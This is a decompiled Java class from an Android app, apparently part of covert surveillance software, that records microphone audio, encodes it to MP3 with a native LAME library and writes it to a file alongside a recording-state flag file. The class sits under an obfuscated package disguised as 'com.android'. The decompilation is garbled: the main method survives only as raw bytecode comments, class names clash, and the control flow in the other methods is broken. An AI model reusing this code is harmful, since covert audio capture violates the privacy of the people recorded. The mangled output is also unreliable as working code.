package com.android.a;

import android.media.AudioRecord;
import com.vvt.io.d;
import com.vvt.io.p;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private boolean c = false;
  private a d;
  
  static
  {
    System.loadLibrary("mp3lame");
  }
  
  private void a(AudioRecord paramAudioRecord)
  {
    if (paramAudioRecord != null) {}
    try
    {
      paramAudioRecord.stop();
      paramAudioRecord.release();
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  private void a(String paramString, boolean paramBoolean)
  {
    for (;;)
    {
      try
      {
        bool = a;
        if ((!bool) || (paramBoolean))
        {
          localObject1 = new java/io/FileWriter;
          Object localObject2 = new java/io/File;
          ((File)localObject2).<init>(paramString);
          ((FileWriter)localObject1).<init>((File)localObject2);
          localObject2 = String.valueOf(paramBoolean);
          ((FileWriter)localObject1).write((String)localObject2);
          ((FileWriter)localObject1).close();
          return;
        }
      }
      catch (IOException localIOException)
      {
        Object localObject1;
        boolean bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      localObject1 = new java/io/File;
      ((File)localObject1).<init>(paramString);
      ((File)localObject1).delete();
      bool = a;
      if (!bool) {}
    }
  }
  
  public static boolean a(String paramString)
  {
    String str = p.a(paramString, "RecordingStateFlag.dat");
    boolean bool1 = d.f(str);
    boolean bool2 = a;
    if ((!bool2) || (bool1))
    {
      bool1 = false;
      str = null;
    }
    for (;;)
    {
      return bool1;
      bool1 = true;
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    this.c = false;
    bool = a;
    if (bool) {}
  }
  
  public void a(a parama)
  {
    this.d = parama;
  }
  
  public void a(String paramString1, String paramString2, int paramInt)
  {
    a(paramString1, paramString2, paramInt, 1);
  }
  
  /* Error */
  public void a(String paramString1, String paramString2, int paramInt1, int paramInt2)
  {
    // Byte code:
    //   0: getstatic 15	com/android/a/removeFromPath:a	Z
    //   3: istore 5
    //   5: iload 5
    //   7: ifeq +3 -> 10
    //   10: getstatic 15	com/android/a/removeFromPath:a	Z
    //   13: istore 5
    //   15: iload 5
    //   17: ifeq +3 -> 20
    //   20: getstatic 15	com/android/a/removeFromPath:a	Z
    //   23: istore 5
    //   25: iload 5
    //   27: ifeq +3 -> 30
    //   30: getstatic 15	com/android/a/removeFromPath:a	Z
    //   33: istore 5
    //   35: iload 5
    //   37: ifeq +3 -> 40
    //   40: iload_3
    //   41: ifgt +50 -> 91
    //   44: getstatic 20	com/android/a/removeFromPath:removeFromPath	Z
    //   47: istore 5
    //   49: iload 5
    //   51: ifeq +3 -> 54
    //   54: aload_0
    //   55: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   58: astore 6
    //   60: aload 6
    //   62: ifnull +28 -> 90
    //   65: aload_0
    //   66: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   69: astore 6
    //   71: bipush 9
    //   73: istore 7
    //   75: ldc 93
    //   77: astore 8
    //   79: aload 6
    //   81: iload 7
    //   83: aload 8
    //   85: invokeinterface 98 3 0
    //   90: return
    //   91: aload_0
    //   92: getfield 34	com/android/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   95: istore 5
    //   97: iload 5
    //   99: ifeq +52 -> 151
    //   102: getstatic 20	com/android/a/removeFromPath:removeFromPath	Z
    //   105: istore 5
    //   107: iload 5
    //   109: ifeq +3 -> 112
    //   112: aload_0
    //   113: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   116: astore 6
    //   118: aload 6
    //   120: ifnull -30 -> 90
    //   123: aload_0
    //   124: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   127: astore 6
    //   129: bipush 10
    //   131: istore 7
    //   133: ldc 101
    //   135: astore 8
    //   137: aload 6
    //   139: iload 7
    //   141: aload 8
    //   143: invokeinterface 98 3 0
    //   148: goto -58 -> 90
    //   151: bipush -19
    //   153: invokestatic 107	android/os/Process:setThreadPriority	(I)V
    //   156: iconst_2
    //   157: istore 7
    //   159: iload_3
    //   160: bipush 16
    //   162: iload 7
    //   164: invokestatic 113	android/media/AudioRecord:getMinBufferSize	(III)I
    //   167: istore 9
    //   169: getstatic 15	com/android/a/removeFromPath:a	Z
    //   172: istore 5
    //   174: iload 5
    //   176: ifeq +3 -> 179
    //   179: iload 9
    //   181: ifge +68 -> 249
    //   184: aload_0
    //   185: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   188: astore 6
    //   190: aload 6
    //   192: ifnull -102 -> 90
    //   195: aload_0
    //   196: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   199: astore 6
    //   201: iconst_2
    //   202: istore 7
    //   204: new 115	java/lang/StringBuilder
    //   207: astore 8
    //   209: aload 8
    //   211: invokespecial 116	java/lang/StringBuilder:<init>	()V
    //   214: ldc 118
    //   216: astore 10
    //   218: aload 8
    //   220: aload 10
    //   222: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   225: iload 9
    //   227: invokevirtual 125	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   230: invokevirtual 129	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   233: astore 8
    //   235: aload 6
    //   237: iload 7
    //   239: aload 8
    //   241: invokeinterface 98 3 0
    //   246: goto -156 -> 90
    //   249: ldc 73
    //   251: astore 6
    //   253: aload_1
    //   254: aload 6
    //   256: invokestatic 78	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   259: astore 11
    //   261: getstatic 15	com/android/a/removeFromPath:a	Z
    //   264: istore 5
    //   266: iload 5
    //   268: ifeq +3 -> 271
    //   271: getstatic 15	com/android/a/removeFromPath:a	Z
    //   274: istore 5
    //   276: iload 5
    //   278: ifeq +3 -> 281
    //   281: new 36	android/media/AudioRecord
    //   284: astore 6
    //   286: bipush 16
    //   288: istore 12
    //   290: iload 9
    //   292: iconst_2
    //   293: imul
    //   294: istore 13
    //   296: iload 4
    //   298: istore 7
    //   300: iload_3
    //   301: istore 14
    //   303: aload 6
    //   305: iload 4
    //   307: iload_3
    //   308: iload 12
    //   310: iconst_2
    //   311: iload 13
    //   313: invokespecial 132	android/media/AudioRecord:<init>	(IIIII)V
    //   316: iload_3
    //   317: iconst_2
    //   318: imul
    //   319: iconst_1
    //   320: imul
    //   321: iconst_5
    //   322: imul
    //   323: istore 7
    //   325: iload 7
    //   327: newarray <illegal type>
    //   329: astore 15
    //   331: aload 15
    //   333: arraylength
    //   334: iconst_2
    //   335: imul
    //   336: istore 16
    //   338: iload 16
    //   340: i2d
    //   341: dstore 17
    //   343: ldc2_w 139
    //   346: dstore 19
    //   348: dload 17
    //   350: dload 19
    //   352: dmul
    //   353: dstore 17
    //   355: ldc2_w 135
    //   358: dload 17
    //   360: dadd
    //   361: dstore 21
    //   363: dload 21
    //   365: d2i
    //   366: istore 14
    //   368: iload 14
    //   370: newarray <illegal type>
    //   372: astore 8
    //   374: new 142	java/io/FileOutputStream
    //   377: astore 10
    //   379: new 48	java/io/File
    //   382: astore 23
    //   384: aload 23
    //   386: aload_2
    //   387: invokespecial 50	java/io/File:<init>	(Ljava/lang/String;)V
    //   390: aload 10
    //   392: aload 23
    //   394: invokespecial 143	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   397: getstatic 15	com/android/a/removeFromPath:a	Z
    //   400: istore 16
    //   402: iload 16
    //   404: ifeq +3 -> 407
    //   407: bipush 32
    //   409: istore 13
    //   411: iload_3
    //   412: iconst_1
    //   413: iload_3
    //   414: iload 13
    //   416: invokestatic 149	com/android/lame/SimpleLame:a	(IIII)V
    //   419: aload_0
    //   420: iconst_1
    //   421: putfield 34	com/android/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   424: iconst_1
    //   425: istore 16
    //   427: aload_0
    //   428: aload 11
    //   430: iload 16
    //   432: invokespecial 152	com/android/a/removeFromPath:a	(Ljava/lang/String;Z)V
    //   435: getstatic 15	com/android/a/removeFromPath:a	Z
    //   438: istore 16
    //   440: iload 16
    //   442: ifeq +3 -> 445
    //   445: aload 6
    //   447: invokevirtual 155	android/media/AudioRecord:startRecording	()V
    //   450: aload_0
    //   451: getfield 34	com/android/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   454: istore 16
    //   456: iload 16
    //   458: ifeq +102 -> 560
    //   461: iconst_0
    //   462: istore 16
    //   464: aconst_null
    //   465: astore 23
    //   467: aload 6
    //   469: aload 15
    //   471: iconst_0
    //   472: iload 9
    //   474: invokevirtual 159	android/media/AudioRecord:read	([SII)I
    //   477: istore 16
    //   479: iload 16
    //   481: ifge +369 -> 850
    //   484: aload_0
    //   485: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   488: astore 15
    //   490: aload 15
    //   492: ifnull +68 -> 560
    //   495: aload_0
    //   496: aload 6
    //   498: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   501: aload_0
    //   502: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   505: astore 15
    //   507: iconst_5
    //   508: istore 13
    //   510: new 115	java/lang/StringBuilder
    //   513: astore 24
    //   515: aload 24
    //   517: invokespecial 116	java/lang/StringBuilder:<init>	()V
    //   520: ldc -91
    //   522: astore 25
    //   524: aload 24
    //   526: aload 25
    //   528: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   531: astore 24
    //   533: aload 24
    //   535: iload 16
    //   537: invokevirtual 125	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   540: astore 23
    //   542: aload 23
    //   544: invokevirtual 129	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   547: astore 23
    //   549: aload 15
    //   551: iload 13
    //   553: aload 23
    //   555: invokeinterface 98 3 0
    //   560: aload 8
    //   562: invokestatic 169	com/android/lame/SimpleLame:flush	([B)I
    //   565: istore 7
    //   567: iload 7
    //   569: ifge +80 -> 649
    //   572: aload_0
    //   573: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   576: astore 23
    //   578: aload 23
    //   580: ifnull +69 -> 649
    //   583: aload_0
    //   584: aload 6
    //   586: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   589: aload_0
    //   590: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   593: astore 23
    //   595: bipush 6
    //   597: istore 13
    //   599: new 115	java/lang/StringBuilder
    //   602: astore 24
    //   604: aload 24
    //   606: invokespecial 116	java/lang/StringBuilder:<init>	()V
    //   609: ldc -84
    //   611: astore 25
    //   613: aload 24
    //   615: aload 25
    //   617: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   620: astore 24
    //   622: aload 24
    //   624: iload 7
    //   626: invokevirtual 125	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   629: astore 24
    //   631: aload 24
    //   633: invokevirtual 129	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   636: astore 24
    //   638: aload 23
    //   640: iload 13
    //   642: aload 24
    //   644: invokeinterface 98 3 0
    //   649: iload 7
    //   651: ifeq +19 -> 670
    //   654: iconst_0
    //   655: istore 16
    //   657: aconst_null
    //   658: astore 23
    //   660: aload 10
    //   662: aload 8
    //   664: iconst_0
    //   665: iload 7
    //   667: invokevirtual 175	java/io/FileOutputStream:write	([BII)V
    //   670: aload 10
    //   672: invokevirtual 176	java/io/FileOutputStream:close	()V
    //   675: iconst_0
    //   676: istore 7
    //   678: aconst_null
    //   679: astore 15
    //   681: aload_0
    //   682: aload 11
    //   684: iconst_0
    //   685: invokespecial 152	com/android/a/removeFromPath:a	(Ljava/lang/String;Z)V
    //   688: aload_0
    //   689: aload 6
    //   691: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   694: invokestatic 177	com/android/lame/SimpleLame:close	()V
    //   697: aconst_null
    //   698: astore 6
    //   700: aload_0
    //   701: iconst_0
    //   702: putfield 34	com/android/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   705: getstatic 15	com/android/a/removeFromPath:a	Z
    //   708: istore 5
    //   710: iload 5
    //   712: ifeq -622 -> 90
    //   715: goto -625 -> 90
    //   718: astore 15
    //   720: getstatic 20	com/android/a/removeFromPath:removeFromPath	Z
    //   723: istore 14
    //   725: iload 14
    //   727: ifeq +3 -> 730
    //   730: aload_0
    //   731: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   734: astore 8
    //   736: aload 8
    //   738: ifnull -648 -> 90
    //   741: aload_0
    //   742: aload 6
    //   744: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   747: aload_0
    //   748: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   751: astore 6
    //   753: iconst_3
    //   754: istore 14
    //   756: aload 15
    //   758: invokevirtual 181	java/io/FileNotFoundException:toString	()Ljava/lang/String;
    //   761: astore 15
    //   763: aload 6
    //   765: iload 14
    //   767: aload 15
    //   769: invokeinterface 98 3 0
    //   774: goto -684 -> 90
    //   777: astore 15
    //   779: getstatic 20	com/android/a/removeFromPath:removeFromPath	Z
    //   782: istore 14
    //   784: iload 14
    //   786: ifeq +3 -> 789
    //   789: aload_0
    //   790: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   793: astore 8
    //   795: aload 8
    //   797: ifnull +36 -> 833
    //   800: aload_0
    //   801: aload 6
    //   803: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   806: aload_0
    //   807: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   810: astore 6
    //   812: iconst_4
    //   813: istore 14
    //   815: aload 15
    //   817: invokevirtual 185	java/lang/IllegalStateException:toString	()Ljava/lang/String;
    //   820: astore 15
    //   822: aload 6
    //   824: iload 14
    //   826: aload 15
    //   828: invokeinterface 98 3 0
    //   833: invokestatic 177	com/android/lame/SimpleLame:close	()V
    //   836: iconst_0
    //   837: istore 5
    //   839: aconst_null
    //   840: astore 6
    //   842: aload_0
    //   843: iconst_0
    //   844: putfield 34	com/android/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   847: goto -757 -> 90
    //   850: iload 16
    //   852: ifeq -402 -> 450
    //   855: aload 15
    //   857: aload 15
    //   859: iload 16
    //   861: aload 8
    //   863: invokestatic 189	com/android/lame/SimpleLame:encode	([S[SI[B)I
    //   866: istore 16
    //   868: iload 16
    //   870: ifge +107 -> 977
    //   873: aload_0
    //   874: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   877: astore 15
    //   879: aload 15
    //   881: ifnull -321 -> 560
    //   884: aload_0
    //   885: aload 6
    //   887: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   890: aload_0
    //   891: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   894: astore 15
    //   896: bipush 6
    //   898: istore 13
    //   900: new 115	java/lang/StringBuilder
    //   903: astore 24
    //   905: aload 24
    //   907: invokespecial 116	java/lang/StringBuilder:<init>	()V
    //   910: ldc -65
    //   912: astore 25
    //   914: aload 24
    //   916: aload 25
    //   918: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   921: astore 24
    //   923: aload 24
    //   925: iload 16
    //   927: invokevirtual 125	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   930: astore 23
    //   932: aload 23
    //   934: invokevirtual 129	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   937: astore 23
    //   939: aload 15
    //   941: iload 13
    //   943: aload 23
    //   945: invokeinterface 98 3 0
    //   950: goto -390 -> 560
    //   953: astore 15
    //   955: aload_0
    //   956: aload 6
    //   958: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   961: aload 15
    //   963: athrow
    //   964: astore 6
    //   966: invokestatic 177	com/android/lame/SimpleLame:close	()V
    //   969: aload_0
    //   970: iconst_0
    //   971: putfield 34	com/android/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   974: aload 6
    //   976: athrow
    //   977: iload 16
    //   979: ifeq -529 -> 450
    //   982: iconst_0
    //   983: istore 13
    //   985: aload 10
    //   987: aload 8
    //   989: iconst_0
    //   990: iload 16
    //   992: invokevirtual 175	java/io/FileOutputStream:write	([BII)V
    //   995: goto -545 -> 450
    //   998: astore 15
    //   1000: getstatic 20	com/android/a/removeFromPath:removeFromPath	Z
    //   1003: istore 16
    //   1005: iload 16
    //   1007: ifeq +3 -> 1010
    //   1010: aload_0
    //   1011: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   1014: astore 23
    //   1016: aload 23
    //   1018: ifnull -458 -> 560
    //   1021: aload_0
    //   1022: aload 6
    //   1024: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   1027: aload_0
    //   1028: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   1031: astore 23
    //   1033: bipush 7
    //   1035: istore 13
    //   1037: aload 15
    //   1039: invokevirtual 193	java/io/IOException:toString	()Ljava/lang/String;
    //   1042: astore 15
    //   1044: aload 23
    //   1046: iload 13
    //   1048: aload 15
    //   1050: invokeinterface 98 3 0
    //   1055: goto -495 -> 560
    //   1058: astore 15
    //   1060: aload_0
    //   1061: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   1064: astore 8
    //   1066: aload 8
    //   1068: ifnull -398 -> 670
    //   1071: aload_0
    //   1072: aload 6
    //   1074: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   1077: aload_0
    //   1078: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   1081: astore 8
    //   1083: bipush 7
    //   1085: istore 16
    //   1087: aload 15
    //   1089: invokevirtual 193	java/io/IOException:toString	()Ljava/lang/String;
    //   1092: astore 15
    //   1094: aload 8
    //   1096: iload 16
    //   1098: aload 15
    //   1100: invokeinterface 98 3 0
    //   1105: goto -435 -> 670
    //   1108: astore 15
    //   1110: aload_0
    //   1111: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   1114: astore 8
    //   1116: aload 8
    //   1118: ifnull -443 -> 675
    //   1121: aload_0
    //   1122: aload 6
    //   1124: invokespecial 162	com/android/a/removeFromPath:a	(Landroid/media/AudioRecord;)V
    //   1127: aload_0
    //   1128: getfield 87	com/android/a/removeFromPath:d	Lcom/android/a/a;
    //   1131: astore 8
    //   1133: bipush 8
    //   1135: istore 12
    //   1137: aload 15
    //   1139: invokevirtual 193	java/io/IOException:toString	()Ljava/lang/String;
    //   1142: astore 15
    //   1144: aload 8
    //   1146: iload 12
    //   1148: aload 15
    //   1150: invokeinterface 98 3 0
    //   1155: goto -480 -> 675
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1158	0	this	removeFromPath
    //   0	1158	1	paramString1	String
    //   0	1158	2	paramString2	String
    //   0	1158	3	paramInt1	int
    //   0	1158	4	paramInt2	int
    //   3	835	5	bool1	boolean
    //   58	899	6	localObject1	Object
    //   964	159	6	localAudioRecord	AudioRecord
    //   73	604	7	i	int
    //   77	1068	8	localObject2	Object
    //   167	306	9	j	int
    //   216	770	10	localObject3	Object
    //   259	424	11	str1	String
    //   288	859	12	k	int
    //   294	753	13	m	int
    //   301	68	14	n	int
    //   723	3	14	bool2	boolean
    //   754	12	14	i1	int
    //   782	3	14	bool3	boolean
    //   813	12	14	i2	int
    //   329	351	15	localObject4	Object
    //   718	39	15	localFileNotFoundException	java.io.FileNotFoundException
    //   761	7	15	str2	String
    //   777	39	15	localIllegalStateException	IllegalStateException
    //   820	120	15	localObject5	Object
    //   953	9	15	localObject6	Object
    //   998	40	15	localIOException1	IOException
    //   1042	7	15	str3	String
    //   1058	30	15	localIOException2	IOException
    //   1092	7	15	str4	String
    //   1108	30	15	localIOException3	IOException
    //   1142	7	15	str5	String
    //   336	3	16	i3	int
    //   400	63	16	bool4	boolean
    //   477	514	16	i4	int
    //   1003	3	16	bool5	boolean
    //   1085	12	16	i5	int
    //   341	18	17	d1	double
    //   346	5	19	d2	double
    //   361	3	21	d3	double
    //   382	663	23	localObject7	Object
    //   513	411	24	localObject8	Object
    //   522	395	25	str6	String
    // Exception table:
    //   from	to	target	type
    //   374	377	718	java/io/FileNotFoundException
    //   379	382	718	java/io/FileNotFoundException
    //   386	390	718	java/io/FileNotFoundException
    //   392	397	718	java/io/FileNotFoundException
    //   430	435	777	java/lang/IllegalStateException
    //   435	438	777	java/lang/IllegalStateException
    //   445	450	777	java/lang/IllegalStateException
    //   450	454	953	finally
    //   472	477	953	finally
    //   484	488	953	finally
    //   496	501	953	finally
    //   501	505	953	finally
    //   510	513	953	finally
    //   515	520	953	finally
    //   526	531	953	finally
    //   535	540	953	finally
    //   542	547	953	finally
    //   553	560	953	finally
    //   560	565	953	finally
    //   572	576	953	finally
    //   584	589	953	finally
    //   589	593	953	finally
    //   599	602	953	finally
    //   604	609	953	finally
    //   615	620	953	finally
    //   624	629	953	finally
    //   631	636	953	finally
    //   642	649	953	finally
    //   665	670	953	finally
    //   670	675	953	finally
    //   684	688	953	finally
    //   861	866	953	finally
    //   873	877	953	finally
    //   885	890	953	finally
    //   890	894	953	finally
    //   900	903	953	finally
    //   905	910	953	finally
    //   916	921	953	finally
    //   925	930	953	finally
    //   932	937	953	finally
    //   943	950	953	finally
    //   990	995	953	finally
    //   1000	1003	953	finally
    //   1010	1014	953	finally
    //   1022	1027	953	finally
    //   1027	1031	953	finally
    //   1037	1042	953	finally
    //   1048	1055	953	finally
    //   1060	1064	953	finally
    //   1072	1077	953	finally
    //   1077	1081	953	finally
    //   1087	1092	953	finally
    //   1098	1105	953	finally
    //   1110	1114	953	finally
    //   1122	1127	953	finally
    //   1127	1131	953	finally
    //   1137	1142	953	finally
    //   1148	1155	953	finally
    //   430	435	964	finally
    //   435	438	964	finally
    //   445	450	964	finally
    //   689	694	964	finally
    //   779	782	964	finally
    //   789	793	964	finally
    //   801	806	964	finally
    //   806	810	964	finally
    //   815	820	964	finally
    //   826	833	964	finally
    //   956	961	964	finally
    //   961	964	964	finally
    //   990	995	998	java/io/IOException
    //   665	670	1058	java/io/IOException
    //   670	675	1108	java/io/IOException
  }
  
  public boolean b()
  {
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/android/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */